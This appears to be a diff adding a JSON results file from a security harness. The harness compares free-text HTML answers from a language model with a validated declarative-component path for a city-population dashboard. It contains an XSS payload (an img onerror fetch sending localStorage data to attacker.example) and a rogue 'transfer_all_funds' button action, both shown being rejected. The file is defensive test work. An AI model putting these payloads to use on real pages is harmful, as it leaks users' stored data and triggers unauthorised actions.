@@ -1,0 +1,113 @@
+{
+  "task_text_naive": "Compare the populations of London, Berlin, and Paris, and return an HTML dashboard I can open in a browser.",
+  "task_ui_declarative": "Compare the populations of London, Berlin, and Paris.",
+  "gateway_base_url": "http://127.0.0.1:8111",
+  "gateway_provider_env": "gemini",
+  "failure_1_execution": {
+    "payload": "<img src=\"x\" onerror=\"fetch('https://attacker.example/e?m='+localStorage.memoryHandle)\">",
+    "as_free_text__naive_path": {
+      "validated_by_anything": false,
+      "scan": {
+        "script_tags": 0,
+        "event_handler_attrs": 1,
+        "js_or_data_urls": 0,
+        "raw_buttons": 0
+      },
+      "verdict": "would run verbatim if a client ever did element.innerHTML = this_text"
+    },
+    "as_declarative_component__catalog_path": {
+      "accepted_ids": [
+        "root",
+        "ok"
+      ],
+      "rejections": [
+        {
+          "component_id": "evil",
+          "field": "type",
+          "invariant": "catalog",
+          "reason": "unknown component type 'RawHtml'"
+        }
+      ],
+      "verdict": "rejected by name before it ever reaches the client"
+    }
+  },
+  "failure_2_consistency": {
+    "note": "Two independent live runs of the identical naive prompt. Each re-types both structure and every value as free text from scratch; nothing binds either answer to a stable source.",
+    "run_a": {
+      "run_id": "run-4b3e60304fbb",
+      "answer_chars": 1970,
+      "answer_preview": "Based on the data provided in the source, here is the population comparison for London, Berlin, and Paris.\n\n### Population Estimates\n*   **London:** ~8,900,000\n*   **Berlin:** ~3,750,000\n*   **Paris:** ~2,100,000 (City proper)\n\n### Population Comparison Dashboard\nYou can save the following code as an `.html` file (e.g., `cities.html`) and open it in any web browser to view the dashboard:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>European Cities Population Comparison</title>\n    <style>\n        body { font-family: sans-serif; padding: 40px; background-color: #f4f4f9; }\n        .container { max-width: 700px; margin: auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }\n        h1 { color: #333; text"
+    },
+    "run_b": {
+      "run_id": "run-7caf4c5b4f9a",
+      "answer_chars": 1970,
+      "answer_preview": "Based on the data provided in the source, here is the population comparison for London, Berlin, and Paris.\n\n### Population Estimates\n*   **London:** ~8,900,000\n*   **Berlin:** ~3,750,000\n*   **Paris:** ~2,100,000 (City proper)\n\n### Population Comparison Dashboard\nYou can save the following code as an `.html` file (e.g., `cities.html`) and open it in any web browser to view the dashboard:\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>European Cities Population Comparison</title>\n    <style>\n        body { font-family: sans-serif; padding: 40px; background-color: #f4f4f9; }\n        .container { max-width: 700px; margin: auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }\n        h1 { color: #333; text"
+    },
+    "identical_text": false,
+    "naive_scan_a": {
+      "script_tags": 0,
+      "event_handler_attrs": 0,
+      "js_or_data_urls": 0,
+      "raw_buttons": 0
+    },
+    "naive_scan_b": {
+      "script_tags": 0,
+      "event_handler_attrs": 0,
+      "js_or_data_urls": 0,
+      "raw_buttons": 0
+    }
+  },
+  "failure_3_interaction": {
+    "note": "The live naive answer's own <button> count (if any), plus a deterministic proof against real code -- independent of whether this particular live call happened to include a button at all.",
+    "live_naive_raw_buttons_a": 0,
+    "live_naive_raw_buttons_b": 0,
+    "live_declarative_button_components": [],
+    "payload": {
+      "id": "evil",
+      "type": "Button",
+      "label": "Wire funds",
+      "onPress": {
+        "action": "transfer_all_funds"
+      }
+    },
+    "as_free_text__naive_path": {
+      "verdict": "a naive <button> has no channel back to the graph at all -- there is nothing to accept OR reject its action, because it never named one the harness could check"
+    },
+    "as_declarative_component__event_path": {
+      "accepted_ids": [
+        "root",
+        "ok"
+      ],
+      "rejections": [
+        {
+          "component_id": "evil",
+          "field": "onPress",
+          "invariant": "event",
+          "reason": "unregistered action 'transfer_all_funds'"
+        }
+      ],
+      "verdict": "rejected by name: an unregistered action is refused even though the component itself is perfectly catalog-legal"
+    }
+  },
+  "declarative_contrast": {
+    "run_id": "run-22710f6fd00b",
+    "provider": "gemini_1",
+    "model": "gemini-3.1-flash-lite-preview",
+    "validator": {
+      "proposed": 11,
+      "accepted": 11,
+      "rejected": 0,
+      "ok": true,
+      "rejections": [],
+      "dangling_child_refs": [],
+      "component_types": [
+        "Card",
+        "Column",
+        "List",
+        "ProgressBar",
+        "Text"
+      ],
+      "component_count": 11
+    }
+  }
+}
